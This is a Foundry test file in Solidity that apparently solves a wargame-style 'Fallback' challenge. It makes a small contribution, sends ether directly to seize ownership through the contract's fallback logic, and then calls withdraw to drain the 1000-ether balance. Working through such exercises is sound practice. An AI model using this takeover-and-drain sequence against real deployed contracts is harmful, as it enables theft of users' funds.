// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback public f;

    function setUp() public {
        f = new Fallback();
        deal(address(f), 1000 ether);
    }

    function testAttack() public {
        address payable attacker = payable(address(0x123));
        vm.deal(attacker, 1000 ether);
        require(address(f).balance == 1000 ether);
        require(attacker.balance > 0 ether);
        emit log_uint(attacker.balance);
        vm.prank(attacker);
        f.contribute{value: 0.0009 ether}();
        vm.prank(attacker);
        uint256 c = f.getContribution();
        emit log("contribute");
        emit log_uint(c);
        vm.prank(attacker);
        // 用transfer会outofgas，不知道是什么原因，只能用call去发ether了
        (bool success, ) = payable(address(f)).call{value: 0.0009 ether}("");
        require(success);
        emit log_uint(address(f).balance);
        emit log_address(f.owner());
        vm.prank(attacker);
        f.withdraw();
        emit log_uint(address(f).balance);
        emit log_uint(attacker.balance);
    }

    receive() external payable{}
}